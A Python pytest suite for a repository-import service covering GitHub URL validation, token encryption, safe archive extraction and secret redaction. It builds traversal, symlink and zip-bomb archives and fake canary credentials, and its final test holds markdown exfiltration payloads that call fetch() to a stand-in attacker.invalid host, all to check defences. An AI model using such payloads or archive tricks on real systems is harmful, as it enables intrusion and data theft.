from __future__ import annotations

import io
import json
import shutil
import stat
import tarfile
import uuid
import zipfile
from pathlib import Path

import pytest
from fastapi.testclient import TestClient
from sqlmodel import select, text

from app.db import get_session, init_db
from app.main import app
from app.models import (
    Project,
    RepositoryChunk,
    RepositoryFile,
    RepositorySnapshot,
    RepositorySource,
    Setting,
)
from app import repository


@pytest.fixture(scope="module")
def client():
    with TestClient(app) as test_client:
        yield test_client


def test_github_url_and_ref_validation():
    parsed = repository.parse_github_url("https://github.com/OpenAI/example.git/")
    assert parsed.owner == "OpenAI"
    assert parsed.repository == "example"
    assert parsed.canonical_url == "https://github.com/OpenAI/example"
    assert repository.parse_github_url("OpenAI/example") == parsed
    assert repository.validate_github_ref("feature/repository-analysis") == \
        "feature/repository-analysis"

    for bad in (
        "http://github.com/a/b", "https://evil.example/a/b",
        "https://user:token@github.com/a/b", "https://github.com/a/b/tree/main",
        "https://github.com/a/b?token=secret",
    ):
        with pytest.raises(ValueError):
            repository.parse_github_url(bad)
    for bad_ref in ("../main", "main~1", "bad ref", "/main", "main.lock"):
        with pytest.raises(ValueError):
            repository.validate_github_ref(bad_ref)


def test_github_credential_is_encrypted_and_masked(client):
    repository.delete_github_token()
    token = "github_pat_" + "a" * 48
    response = client.put("/api/repositories/credentials", json={"token": token})
    assert response.status_code == 200
    assert response.json() == {"configured": True, "token": "••••set••••"}
    with get_session() as session:
        stored = session.get(Setting, repository.GITHUB_CREDENTIAL_KEY)
        assert stored.value.startswith("enc:")
        assert token not in stored.value
    assert client.get("/api/repositories/credentials").json()["token"] == "••••set••••"
    assert client.delete("/api/repositories/credentials").json() == {
        "configured": False, "token": "",
    }


def _mock_github_json(url: str, *, token: str = "") -> dict:
    sha = "1" * 40
    if "/commits/" in url:
        return {
            "sha": sha,
            "commit": {"committer": {"date": "2026-07-12T12:00:00Z"}},
        }
    if "/git/trees/" in url:
        return {
            "truncated": False,
            "tree": [
                {"path": "README.md", "type": "blob", "size": 120},
                {"path": "src/main.py", "type": "blob", "size": 400},
                {"path": "node_modules/pkg/index.js", "type": "blob", "size": 900},
                {"path": "vendor/lib", "type": "commit", "mode": "160000"},
            ],
        }
    return {
        "name": "private-demo",
        "description": "Private static-analysis fixture",
        "default_branch": "main",
        "private": True,
        "size": 12,
    }


def test_private_preflight_and_create_are_local_only(client, monkeypatch):
    token = "github_pat_" + "b" * 48
    repository.set_github_token(token)
    monkeypatch.setattr(repository, "_github_json", _mock_github_json)
    request = {
        "url": "https://github.com/acme/private-demo",
        "ref": "main",
        "include_paths": ["src", "README.md"],
    }
    preflight = client.post("/api/repositories/preflight", json=request)
    assert preflight.status_code == 200, preflight.text
    data = preflight.json()
    assert data["source"]["private"] is True
    assert data["source"]["local_only"] is True
    assert data["source"]["commit_sha"] == "1" * 40
    assert data["coverage_preview"]["eligible_files"] == 2

    moved = client.post("/api/repositories", json={
        **request, "analyze": False, "expected_sha": "2" * 40,
    })
    assert moved.status_code == 409
    created = client.post("/api/repositories", json={
        **request, "analyze": False, "expected_sha": "1" * 40,
    })
    assert created.status_code == 200, created.text
    body = created.json()
    assert body["project"]["source_type"] == "github"
    assert body["snapshot"]["status"] == "pending"
    assert body["snapshot"]["commit_sha"] == "1" * 40
    with get_session() as session:
        source = session.get(RepositorySource, body["source"]["id"])
        assert source.is_private is True and source.local_only is True
        assert source.credential_ref == repository.GITHUB_CREDENTIAL_KEY
        assert token not in json.dumps(source.model_dump(mode="json"))
    repository.delete_github_token()


def _limits(**overrides) -> dict:
    values = repository.repository_scan_settings()
    values.update({
        "max_files": 20,
        "max_file_bytes": 4 * 1024 * 1024,
        "max_unpacked_bytes": 8 * 1024 * 1024,
        "max_compression_ratio": 100,
    })
    values.update(overrides)
    return values


def _tar_entry(handle: tarfile.TarFile, name: str, body: bytes = b"x",
               *, kind: bytes | None = None) -> None:
    info = tarfile.TarInfo(name)
    if kind is not None:
        info.type = kind
        info.linkname = "elsewhere"
        info.size = 0
        handle.addfile(info)
    else:
        info.size = len(body)
        handle.addfile(info, io.BytesIO(body))


def test_safe_archive_extraction_rejects_traversal_specials_and_case_collisions(tmp_path):
    repo = repository.GitHubRepository("acme", "demo", "https://github.com/acme/demo")
    sha = "2" * 40
    root = f"acme-demo-{sha[:7]}"
    cases = [
        [(f"{root}/../escape", b"x", None)],
        [(f"{root}/hard-link", b"", tarfile.LNKTYPE)],
        [(f"{root}/pipe", b"", tarfile.FIFOTYPE)],
        [(f"{root}/link", b"", tarfile.SYMTYPE),
         (f"{root}/link/child.txt", b"child", None)],
        [(f"{root}/link/child.txt", b"child", None),
         (f"{root}/link", b"", tarfile.SYMTYPE)],
        [(f"{root}/README.md", b"one", None),
         (f"{root}/readme.md", b"two", None)],
    ]
    for number, entries in enumerate(cases):
        archive = tmp_path / f"bad-{number}.tar.gz"
        with tarfile.open(archive, "w:gz") as handle:
            root_info = tarfile.TarInfo(root + "/")
            root_info.type = tarfile.DIRTYPE
            handle.addfile(root_info)
            for name, body, kind in entries:
                _tar_entry(handle, name, body, kind=kind)
        destination = tmp_path / f"out-{number}"
        destination.mkdir()
        with pytest.raises(repository.RepositoryError):
            repository._extract_tar(
                archive, destination, repo, sha, limits=_limits(),
                compressed_bytes=archive.stat().st_size, progress=None, cancelled=None)
        assert not (tmp_path / "escape").exists()


def test_archive_symlinks_are_catalogued_without_materializing_them(tmp_path):
    repo = repository.GitHubRepository("acme", "demo", "https://github.com/acme/demo")
    sha = "6" * 40
    root = f"acme-demo-{sha[:7]}"

    tar_archive = tmp_path / "links.tar.gz"
    with tarfile.open(tar_archive, "w:gz") as handle:
        root_info = tarfile.TarInfo(root + "/")
        root_info.type = tarfile.DIRTYPE
        handle.addfile(root_info)
        _tar_entry(handle, f"{root}/README.md", b"demo")
        _tar_entry(handle, f"{root}/docs/current", b"", kind=tarfile.SYMTYPE)
    tar_destination = tmp_path / "tar-out"
    tar_destination.mkdir()
    files, size, links = repository._extract_tar(
        tar_archive, tar_destination, repo, sha, limits=_limits(),
        compressed_bytes=tar_archive.stat().st_size, progress=None, cancelled=None)
    assert (files, size, links) == (1, 4, ["docs/current"])
    assert (tar_destination / "README.md").read_text() == "demo"
    assert not (tar_destination / "docs" / "current").exists()

    zip_archive = tmp_path / "links.zip"
    with zipfile.ZipFile(zip_archive, "w") as handle:
        handle.writestr(root + "/", b"")
        handle.writestr(root + "/README.md", b"demo")
        # Even a misleading trailing slash must not make a Unix symlink look
        # like a materializable directory.
        link = zipfile.ZipInfo(root + "/docs/current/")
        link.create_system = 3
        link.external_attr = (stat.S_IFLNK | 0o777) << 16
        handle.writestr(link, b"../README.md")
    zip_destination = tmp_path / "zip-out"
    zip_destination.mkdir()
    files, size, links = repository._extract_zip(
        zip_archive, zip_destination, repo, sha, limits=_limits(),
        compressed_bytes=zip_archive.stat().st_size, progress=None, cancelled=None)
    assert (files, size, links) == (1, 4, ["docs/current"])
    assert (zip_destination / "README.md").read_text() == "demo"
    assert not (zip_destination / "docs" / "current").exists()


def test_zip_special_files_remain_rejected(tmp_path):
    repo = repository.GitHubRepository("acme", "demo", "https://github.com/acme/demo")
    sha = "8" * 40
    root = f"acme-demo-{sha[:7]}"
    archive = tmp_path / "special.zip"
    with zipfile.ZipFile(archive, "w") as handle:
        handle.writestr(root + "/", b"")
        special = zipfile.ZipInfo(root + "/pipe")
        special.create_system = 3
        special.external_attr = (stat.S_IFIFO | 0o600) << 16
        handle.writestr(special, b"")
    destination = tmp_path / "special-out"
    destination.mkdir()
    with pytest.raises(repository.RepositoryError, match="special"):
        repository._extract_zip(
            archive, destination, repo, sha, limits=_limits(),
            compressed_bytes=archive.stat().st_size, progress=None, cancelled=None)


def test_zip_compression_bomb_is_rejected(tmp_path):
    repo = repository.GitHubRepository("acme", "demo", "https://github.com/acme/demo")
    sha = "3" * 40
    root = f"acme-demo-{sha[:7]}"
    archive = tmp_path / "bomb.zip"
    with zipfile.ZipFile(archive, "w", compression=zipfile.ZIP_DEFLATED) as handle:
        handle.writestr(root + "/", b"")
        handle.writestr(root + "/zeros.bin", b"0" * (2 * 1024 * 1024))
    destination = tmp_path / "bomb-out"
    destination.mkdir()
    with pytest.raises(repository.RepositoryLimitError, match="compression"):
        repository._extract_zip(
            archive, destination, repo, sha,
            limits=_limits(max_compression_ratio=10),
            compressed_bytes=archive.stat().st_size, progress=None, cancelled=None)


def _write_fixture(root: Path) -> None:
    (root / "src").mkdir(parents=True)
    (root / "node_modules" / "pkg").mkdir(parents=True)
    (root / "README.md").write_text(
        "# Demo\n\nAPI_KEY=supersecret-canary-1234\n\nnpm run dev\n",
        encoding="utf-8",
    )
    (root / "src" / "main.py").write_text(
        'import os\nPORT = os.getenv("APP_PORT")\n', encoding="utf-8")
    (root / "config.txt").write_text(
        "DB_PASSWORD=private-database-canary-9876\n", encoding="utf-8")
    (root / "leak.txt").write_text(
        "postgres://admin:hunter2@db.internal/app\n"
        "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9."
        "eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkphbmUifQ."
        "signaturevalue1234567890\n",
        encoding="utf-8",
    )
    (root / "package.json").write_text(json.dumps({
        "dependencies": {"express": "^5.0.0"},
        "devDependencies": {"vitest": "^3.0.0"},
        "scripts": {"dev": "node src/main.js"},
        "engines": {"node": ">=22"},
    }), encoding="utf-8")
    (root / "package-lock.json").write_text(
        '{"lockfileVersion":3,"packages":{}}', encoding="utf-8")
    (root / ".env").write_text("PASSWORD=do-not-index-this\n", encoding="utf-8")
    (root / "node_modules" / "pkg" / "index.js").write_text(
        "module.exports = 1", encoding="utf-8")
    # newline="\n": LFS pointers are byte-exact in GitHub tarballs, and the
    # detector requires "spec/v1\n" — Windows text-mode CRLF would break it.
    (root / "model.dat").write_text(
        "version https://git-lfs.github.com/spec/v1\n"
        "oid sha256:" + "a" * 64 + "\nsize 999\n", encoding="utf-8",
        newline="\n")
    (root / ".gitmodules").write_text(
        '[submodule "lib"]\n\tpath = external/lib\n\turl = https://github.com/acme/lib\n',
        encoding="utf-8")


def test_static_inventory_redacts_secrets_and_reuses_chunk_cache(tmp_path, monkeypatch):
    init_db()
    repository_root = tmp_path / "repositories"
    monkeypatch.setattr(repository.settings, "repository_dir", repository_root)
    unique = uuid.uuid4().hex[:10]
    sha_one, sha_two = "4" * 40, "5" * 40

    first_root = repository_root / unique / sha_one
    _write_fixture(first_root)
    with get_session() as session:
        project = Project(
            slug=f"repository-{unique}", title="Repository fixture",
            source="https://github.com/acme/demo", source_type="github")
        session.add(project)
        session.flush()
        source = RepositorySource(
            project_id=project.id, owner="acme", repository="demo",
            canonical_url="https://github.com/acme/demo", requested_ref="main",
            default_branch="main")
        session.add(source)
        session.flush()
        snapshot = RepositorySnapshot(
            source_id=source.id, requested_ref="main", resolved_sha=sha_one,
            relative_path=f"{unique}/{sha_one}",
            omitted_links=json.dumps(["docs/current"]))
        session.add(snapshot)
        session.commit()
        session.refresh(source)
        session.refresh(snapshot)
        repository.scan_repository_snapshot(session, source, snapshot)

        files = session.exec(select(RepositoryFile).where(
            RepositoryFile.snapshot_id == snapshot.id)).all()
        by_path = {row.path: row for row in files}
        assert by_path[".env"].restricted and by_path[".env"].excluded
        assert by_path["config.txt"].restricted and not by_path["config.txt"].excluded
        assert by_path["leak.txt"].restricted and by_path["leak.txt"].excluded
        assert by_path["node_modules/pkg/index.js"].vendor
        assert by_path["package-lock.json"].exclusion_reason == "facts_only"
        assert by_path["model.dat"].lfs_pointer and by_path["model.dat"].excluded
        assert by_path["external/lib"].submodule
        assert by_path["docs/current"].symlink
        assert by_path["docs/current"].excluded
        assert by_path["docs/current"].exclusion_reason == "symlink_not_followed"
        assert json.loads(snapshot.omitted_links) == ["docs/current"]

        chunks = session.exec(select(RepositoryChunk).join(
            RepositoryFile, RepositoryFile.id == RepositoryChunk.file_id).where(
                RepositoryFile.snapshot_id == snapshot.id)).all()
        combined = "\n".join(row.body for row in chunks)
        assert "supersecret-canary-1234" not in combined
        assert "private-database-canary-9876" not in combined
        assert "[REDACTED]" in combined
        assert session.exec(text(
            "SELECT COUNT(*) FROM repository_chunk_fts "
            "WHERE repository_chunk_fts MATCH 'supersecret'"
        )).one()[0] == 0

        facts = json.loads(snapshot.facts)
        assert "supersecret-canary-1234" not in snapshot.facts
        assert "private-database-canary-9876" not in snapshot.facts
        assert any(item["name"] == "express" for item in facts["dependencies"])
        assert any(item["name"] == "APP_PORT" for item in facts["environment"])
        assert any(item["command"] == "npm run dev" for item in facts["commands"])
        assert any(item["path"] == "package-lock.json" for item in facts["facts_only_files"])
        coverage = facts["coverage"]
        assert coverage["file_count"] == snapshot.file_count == len(files)
        assert coverage["total_bytes"] == snapshot.total_bytes
        assert coverage["indexed_file_count"] == snapshot.indexed_file_count
        assert coverage["indexed_bytes"] == snapshot.indexed_bytes
        assert coverage["excluded_file_count"] == snapshot.excluded_file_count
        assert coverage["files_with_evidence"] == len({row.file_id for row in chunks})
        assert coverage["evidence_chunk_count"] == len(chunks)
        assert coverage["omitted_link_count"] == 1
        assert coverage["omitted_link_paths"] == ["docs/current"]
        assert coverage["omitted_link_paths_omitted"] == 0
        assert coverage["exclusion_reason_counts"]["facts_only"] == 1
        assert coverage["exclusion_reason_counts"]["symlink_not_followed"] == 1
        assert sum(coverage["exclusion_reason_counts"].values()) == \
            snapshot.excluded_file_count
        for values in facts.values():
            if isinstance(values, list):
                for item in values:
                    if isinstance(item, dict) and ("path" in item or "source" in item):
                        assert item.get("evidence_id"), item

        lock_chunks = [row for row in chunks
                       if row.file_id == by_path["package-lock.json"].id]
        assert lock_chunks and all(row.kind == "fact" for row in lock_chunks)
        repository.validate_repository_citations(
            session, snapshot.id, [lock_chunks[0].evidence_id])

        readme_chunk = next(row for row in chunks if row.file_id == by_path["README.md"].id)
        repository.validate_repository_citations(session, snapshot.id, [readme_chunk.evidence_id])
        with pytest.raises(ValueError, match="unknown"):
            repository.validate_repository_citations(session, snapshot.id, ["ENOTREAL"])
        repository.set_chunk_summary(
            session, readme_chunk.id, text_value="cached README summary",
            data={"purpose": "demo"}, config_hash="cfg-1")
        session.commit()

        second_root = repository_root / unique / sha_two
        shutil.copytree(first_root, second_root)
        second = RepositorySnapshot(
            source_id=source.id, parent_snapshot_id=snapshot.id,
            requested_ref="main", resolved_sha=sha_two,
            relative_path=f"{unique}/{sha_two}")
        session.add(second)
        session.commit()
        session.refresh(second)
        repository.scan_repository_snapshot(session, source, second)
        second_chunks = repository.list_repository_evidence(session, second.id)
        reused = next(row for row in second_chunks if row["path"] == "README.md")
        assert reused["summary_text"] == "cached README summary"
        assert reused["summary_config_hash"] == "cfg-1"


def test_repository_settings_expose_map_budgets(client):
    payload = client.get("/api/repositories/settings").json()
    assert payload["static_only"] is True
    assert payload["local_model"]
    assert payload["limits"]["max_map_chunks"] > 0
    assert payload["limits"]["max_map_input_chars"] > 0
    assert client.put("/api/repositories/settings", json={
        "local_model": "gpt-oss:120b-cloud",
    }).status_code == 422


def test_repository_api_reports_omitted_symlinks(client):
    init_db()
    unique = uuid.uuid4().hex[:10]
    sha = "7" * 40
    with get_session() as session:
        project = Project(
            slug=f"repository-links-{unique}", title="Repository links",
            source="https://github.com/acme/demo", source_type="github")
        session.add(project)
        session.flush()
        source = RepositorySource(
            project_id=project.id, owner="acme", repository="demo",
            canonical_url="https://github.com/acme/demo", requested_ref="main",
            default_branch="main")
        session.add(source)
        session.flush()
        snapshot = RepositorySnapshot(
            source_id=source.id, requested_ref="main", resolved_sha=sha,
            relative_path=f"{unique}/{sha}", status="ready",
            omitted_links=json.dumps(["docs/current"]), file_count=1,
            excluded_file_count=1)
        session.add(snapshot)
        session.flush()
        source.current_snapshot_id = snapshot.id
        session.add(source)
        session.add(RepositoryFile(
            snapshot_id=snapshot.id, path="docs/current", role="symlink",
            excluded=True, exclusion_reason="symlink_not_followed", symlink=True))
        session.commit()
        project_id = project.id

    detail = client.get(f"/api/repositories/{project_id}")
    assert detail.status_code == 200
    assert detail.json()["snapshot"]["omitted_links"] == ["docs/current"]
    assert detail.json()["coverage"]["total_files"] == 1
    assert detail.json()["coverage"]["files_with_evidence"] == 0
    assert detail.json()["coverage"]["omitted_link_count"] == 1
    listing = client.get(
        f"/api/repositories/{project_id}/files?include_excluded=true")
    assert listing.status_code == 200
    assert listing.json() == [{
        "id": listing.json()[0]["id"],
        "path": "docs/current",
        "size_bytes": 0,
        "line_count": 0,
        "language": "",
        "role": "symlink",
        "excluded": True,
        "exclusion_reason": "symlink_not_followed",
        "lfs_pointer": False,
        "submodule": False,
        "symlink": True,
    }]


def test_omitted_link_scan_facts_are_bounded():
    links = [f"links/path-{index:03d}" for index in range(200)]
    selected, omitted = repository._bounded_omitted_link_facts(links)
    assert selected == links[:repository.MAX_OMITTED_LINK_FACT_PATHS]
    assert omitted == len(links) - len(selected)
    assert len(json.dumps(selected)) <= repository.MAX_OMITTED_LINK_FACT_CHARS


def test_scanner_chunking_is_linear_and_preserves_line_ranges():
    lines = [(str(index) + "x" * 900) for index in range(400)]
    body = "\n".join(lines)
    chunks = repository._chunks(body, max_lines=200, max_chars=24_000)
    assert "\n".join(chunk[2] for chunk in chunks) == body
    assert all(len(chunk[2]) <= 24_000 for chunk in chunks)
    assert chunks[0][0] == 1 and chunks[-1][1] == len(lines)


def test_submodule_declarations_are_deduplicated_and_bounded():
    facts = {"_seen": set(), "_fact_count": 0}
    body = "\n".join(
        f"[submodule \"s{index}\"]\npath = vendor/module-{index}"
        for index in range(repository.MAX_SUBMODULE_DECLARATIONS + 25)
    )
    paths = repository._parse_submodules(".gitmodules", body, facts)
    assert len(paths) == repository.MAX_SUBMODULE_DECLARATIONS
    assert facts["fact_limits"]["submodules"].startswith("truncated_at_")


def test_restricted_markdown_neutralizes_parser_and_obsidian_bypasses():
    from app import library

    body = (
        "![a\\]](https://attacker.invalid/pixel)\n"
        "![[private-note]]\n"
        "```dataviewjs\nfetch('https://attacker.invalid/leak')\n```\n"
        "$= fetch('https://attacker.invalid/inline-leak')\n"
        "<!--E:ABC123-->\n"
    )
    clean = library.sanitize_restricted_markdown(body)
    outside_fence = clean.split("```", 1)[0]
    assert "![" not in outside_fence
    assert "```text" in clean and "```dataviewjs" not in clean
    assert "$=" not in clean and "&#36;=" in clean
    assert "<!--E:ABC123-->" in clean
